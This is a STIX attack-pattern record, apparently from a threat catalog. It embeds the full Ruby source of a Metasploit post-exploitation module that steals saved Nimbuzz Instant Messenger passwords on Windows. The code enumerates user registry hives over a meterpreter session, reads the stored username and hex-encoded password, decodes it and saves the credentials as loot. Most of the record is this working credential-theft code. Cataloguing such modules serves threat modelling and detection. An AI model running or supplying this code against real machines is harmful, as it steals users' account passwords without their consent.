{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a97a838c-432f-47f7-a826-44af0758b14b",
    "created": "2024-08-14T16:33:08.764092Z",
    "modified": "2024-08-14T16:33:08.764096Z",
    "name": "Windows Gather Nimbuzz Instant Messenger Password Extractor",
    "description": " This module extracts the account passwords saved by Nimbuzz Instant Messenger in hex format.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/nimbuzz.rb",
            "external_id": "nimbuzz.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Nimbuzz Instant Messenger Password Extractor',\n        'Description' => %q{\n          This module extracts the account passwords saved by Nimbuzz Instant\n          Messenger in hex format.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',\n          'Unknown', # SecurityXploded Team, www.SecurityXploded.com\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    creds = Rex::Text::Table.new(\n      'Header' => 'Nimbuzz Instant Messenger Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'User',\n        'Password'\n      ]\n    )\n\n    registry_enumkeys('HKU').each do |k|\n      next unless k.include? 'S-1-5-21'\n      next if k.include? '_Classes'\n\n      vprint_status(\"Looking at Key #{k}\")\n      subkeys = registry_enumkeys(\"HKU\\\\#{k}\\\\Software\\\\Nimbuzz\\\\\")\n\n      if subkeys.nil? || (subkeys == '')\n        print_status('Nimbuzz Instant Messenger not installed for this user.')\n        return\n      end\n\n      user = registry_getvaldata(\"HKU\\\\#{k}\\\\Software\\\\Nimbuzz\\\\PCClient\\\\Application\\\\\", 'Username') || ''\n      hpass = registry_getvaldata(\"HKU\\\\#{k}\\\\Software\\\\Nimbuzz\\\\PCClient\\\\Application\\\\\", 'Password')\n\n      next if hpass.nil? || (hpass == '')\n\n      hpass =~ /.{11}(.*)./\n      decpass = [::Regexp.last_match(1)].pack('H*')\n      print_good(\"User=#{user}, Password=#{decpass}\")\n      creds << [user, decpass]\n    end\n\n    print_status('Storing data...')\n    path = store_loot(\n      'nimbuzz.user.creds',\n      'text/csv',\n      session,\n      creds.to_csv,\n      'nimbuzz_user_creds.csv',\n      'Nimbuzz User Credentials'\n    )\n    print_good(\"Nimbuzz user credentials saved in: #{path}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}